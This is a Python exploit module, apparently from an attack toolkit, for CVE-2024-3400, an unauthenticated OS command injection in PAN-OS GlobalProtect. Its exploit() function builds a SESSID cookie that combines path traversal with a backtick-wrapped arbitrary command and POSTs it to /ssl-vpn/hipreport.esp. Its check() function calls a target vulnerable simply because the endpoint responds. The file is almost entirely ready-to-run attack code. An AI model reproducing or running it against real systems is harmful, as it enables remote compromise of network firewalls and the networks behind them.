"""CVE-2024-3400 â€” PAN-OS GlobalProtect Command Injection.

Exploits the unauthenticated OS command injection via the SESSID cookie
in the GlobalProtect portal / gateway on Palo Alto Networks PAN-OS.
"""

from __future__ import annotations

import requests


def check(
    target: str,
    *,
    timeout: int = 10,
) -> dict:
    """Probe for the GlobalProtect portal endpoint."""
    gp_url = f"{target.rstrip('/')}/ssl-vpn/hipreport.esp"
    try:
        resp = requests.get(gp_url, timeout=timeout, verify=False)  # noqa: S501
        gp_present = resp.status_code in (200, 412)
        return {
            "cve": "CVE-2024-3400",
            "vulnerable": gp_present,
            "status_code": resp.status_code,
        }
    except requests.RequestException:
        return {
            "cve": "CVE-2024-3400",
            "vulnerable": False,
        }


def exploit(
    target: str,
    command: str,
    *,
    timeout: int = 10,
) -> dict:
    """Inject an OS command via the SESSID cookie path traversal."""
    base = target.rstrip("/")
    inject_url = f"{base}/ssl-vpn/hipreport.esp"
    sessid_payload = f"/../../../opt/panlogs/tmp/device_telemetry/hour/aaa`{command}`"
    try:
        resp = requests.post(
            inject_url,
            headers={"Cookie": f"SESSID={sessid_payload}"},
            timeout=timeout,
            verify=False,  # noqa: S501
        )
        return {
            "cve": "CVE-2024-3400",
            "success": resp.status_code == 200,
            "command": command,
            "status_code": resp.status_code,
        }
    except requests.RequestException as exc:
        return {
            "cve": "CVE-2024-3400",
            "success": False,
            "command": command,
            "error": str(exc),
        }
